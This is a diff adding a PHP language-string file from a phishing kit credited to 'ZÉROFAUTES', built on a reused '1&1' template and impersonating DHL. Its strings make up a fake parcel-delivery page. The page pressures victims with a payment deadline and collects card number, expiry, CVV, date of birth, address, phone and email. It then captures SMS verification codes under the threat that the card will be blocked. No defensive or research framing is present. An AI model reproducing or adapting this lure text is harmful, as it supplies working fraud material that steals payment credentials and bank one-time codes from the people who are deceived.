@@ -1,0 +1,90 @@
+<?php
+/*==========================================================================
+* +-+-+-+-+-+-+-+-+-+-+ Author Name      : ZÉROFAUTES
+* |Z|É|R|O|F|A|U|T|E|S| Template Name    : 1&1
+* +-+-+-+-+-+-+-+-+-+-+ Template Version : V.0.1
+===========================================================================*/
+function lang($phrase){
+	static $lang = array(
+		/* Main Page */
+		'Title'  => '| Welcome |', 										/* Title */
+		'Fo9001'  => 'Private customers', 								/* Loading Header */
+		'Fo9002' => 'Business customers', 								/* Loading P 1 */
+		'LdngP2' => 'Send packages,', 									/* Loading P 2 */
+		'LdngP3' => 'Receive packets', 									/* Loading P 3 */
+		'LdngP4' => 'Help & contact',  									/* Loading P 4 */
+		'LdngP5'	 => 'DHL Tracking.',	  							/* DHL TRACKING */
+		'CntP'	 => 'Here you will find information about your shipments.',	  								/* Control Panel */
+		'CusId'	 => 'Track your parcel shipments at any time from shipping to delivery',
+		'InpL1'	 => 'DHL shipment',										/* Label Input 1 */
+		'CusPs'	 => 'tracking number 00340434139185930097 - ',		  									/* Customer Password */
+		'InpL2'	 => 'Status: ',							/* Label Input 2 */
+		'Rmmbr'	 => 'in delivering',										/* Remember Me */
+		'Lbtn'	 => 'Important message!',											/* Login Btn */
+		'Span1'	 => 'To complete the delivery as soon as possible, please confirm the payment ',				/* Are you still ... */
+		'Span2'	 => ', by clicking Next. Online confirmation must be made within the next 14 days, before it expires.',
+		'Ntke'	 => 'Next',									/* Btn next */
+		'AsdH2'	 => 'DHL Package',											/* Service */
+		'AsdS1'	 => 'DHL Services',										/* MailXchange */
+		'AsdS2'	 => 'DHL Express',						/* Detailed help and contact */
+		'AsdS3'	 => 'DHL Logistics',										/* Online FAQs */
+		'AsdS4'	 => 'Contact',										/* GoToAssist */
+		'P1H1'	 => 'Help & customer service',								/* 1&1 MyWebsite*/
+		'P1Pr'	 => 'Here&apos;s how it works',											/* Here's how it works */
+		'P2H1'	 => 'Mobile Apps',								/* Microsoft Office 365 */
+		'P2Pr'	 => 'About Us',					/* Paragraphe 2 Paragraphe */
+		'P3H1'	 => 'Post DHL',									/* 1&1 Domains */
+		'P3Pr'	 => 'Responsibility',											/* Paragraphe 3 Paragraphe */
+		'PLink'	 => 'Presse',									/* More information */
+		'FtrS1'	 => 'Career',							/* 1&1 Internet Ltd. • 2018 */
+		'FtrS2'	 => ' DHL International GmbH - All rights reserved.',									/* Privacy Policy */
+		'Sfokh'	 => 'We need your address to be sure that unauthorized persons cannot access your packages, You have ',									/* We need your address to be sure */
+		'Ayam'	 => '10 working days',									/* 10 working days */
+		'Froth'	 => 'From the arrival of your package to the DHL branch, after this time, the package will be returned to the sender.',									/* From the arrival of your package */
+		'InptCC'	 => 'Cardholder&apos;s name',									/* Cardholder's name */
+		'InptCCN'	 => 'Credit card number',									/* Credit card number */
+		'ExpMmAa'	 => 'Exp MM/YY',									/* Expir */
+		'NumCvC'	 => 'CVV (CVC)',									/* CVV */
+		'AddInf'	 => 'Address',									/* Address */
+		'CodPOs'	 => 'Zip Code',									/* Zip */
+		'MdiNa'	 => 'City',									/* Zip */
+		'Zdiyad'	 => 'Date of Birth DD/MM/YYYY',									/* DOB */
+		'Farnon'	 => 'Phone Number',									/* Phone Number */
+		'Barid'	 => 'Your E-mail',									/* Your Email */
+		'PlzCon'	 => 'Please confirm the following payment.',									/* Please confirm the following */
+		'Theun'	 => 'The unique password has been sent to the mobile number listed below. If you need to change your mobile number, please contact your bank or modify it via the available channels (ATM, web).',									/* Please confirm the following */
+		'March'	 => 'Merchant:',									/* Merchant */
+		'ExpDh'	 => 'DHL EXPRESS',									/* DHL EXPRESS */
+		'Ch7al'	 => 'Amount:',									/* Amount */
+		'Tarikh'	 => 'Date:',									/* Date */
+		'TlNum'	 => 'Your Phone Number:',									/* Your Phone Number */
+		'SmCos'	 => 'code SMS:',									/* Your SMS */
+		'PlzSm'	 => 'Please enter the verification code received by sms: ',				/* Please enter the */
+		'Subnn'	 => 'Submit',				/* Submit */
+		'AllCp'	 => 'DHL International GmbH - All rights reserved.',				/* All Right */
+		'SmEnv'	 => 'SMS code sent...',				/* SMS code sent... */
+		'SmWron'	 => 'SMS is wrong or expired! After (3) errors in entering the code received via SMS, the current transaction is canceled and the credit card blocked.',				/* SMS is wrong */
+		'LastSm'	 => 'Warning! Please Enter the last SMS received',				/* SMS is wrong */
+		'YouHav'	 => 'You have successfully activated your shipping process.You will receive an email from us when we send your package.'				/* SMS is wrong */
+		
+		
+		
+		
+	);	
+	return $lang[$phrase];
+}
+
+
+
+
+//		 | ' | = &apos;
+
+
+
+
+ ?>
+ 
+ 
+ 
+ 
+ 
